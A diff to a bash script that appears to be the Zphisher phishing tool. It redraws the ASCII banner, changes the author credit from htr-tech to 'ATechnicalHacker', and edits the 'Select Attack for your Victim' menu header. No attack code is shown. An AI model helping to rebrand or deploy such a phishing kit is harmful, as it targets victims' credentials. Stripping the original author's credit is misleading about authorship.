@@ -7,18 +7,18 @@ command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Instal
 }
 banner() {
 clear
-printf " \e[33;1m ______      _     _     _               \e[0m\n"
-printf " \e[33;1m|___  /     | |   (_)   | |              \e[0m\n"
-printf " \e[33;1m   / / _ __ | |__  _ ___| |__   ___ _ __ \e[0m\n"
-printf " \e[32;1m  / /\e[33;1m | '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
-printf " \e[32;1m / /__| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
-printf " \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
-printf " \e[33;1m      | |                                \e[0m\n"
-printf " \e[33;1m      |_|           \e[1;97m    Version 2.0      \e[0m\n"
+printf " \e[33;1m        _________   ____________| |      | |       \e[0m\n"
+printf " \e[33;1m       /  ______\   ____________| |      | |              \e[0m\n"
+printf " \e[33;1m      /  /    \  \       | |    | |      | |\e[0m\n"
+printf " \e[32;1m     /  /      \  \      | |    | |______| | \e[0m\n"
+printf " \e[32;1m    /  /________\  \     | |    | |______| |          \e[33;1m     \e[0m\n"
+printf " \e[32;1m   /  /__________\  \    | |    | |      | |   \e[0m\n"
+printf " \e[33;1m  /  /            \  \   | |    | |      | |     \e[0m\n"
+printf " \e[33;1m /  /              \  \  | |    | |      | | \e[1;97m    Version 2.0      \e[0m\n"
 printf " \n"
-printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
+printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by ATechnicalHacker (ATH)\e[0m\n"
 printf " \n"
-printf " \e[36;1m.:.Select Any Attack for your Victim.:.\e[0m\n"
+printf " \e[36;1m.:.Select One  Attack for your Victim.:.\e[0m\n"
 printf " \n"
 }
 menu() {
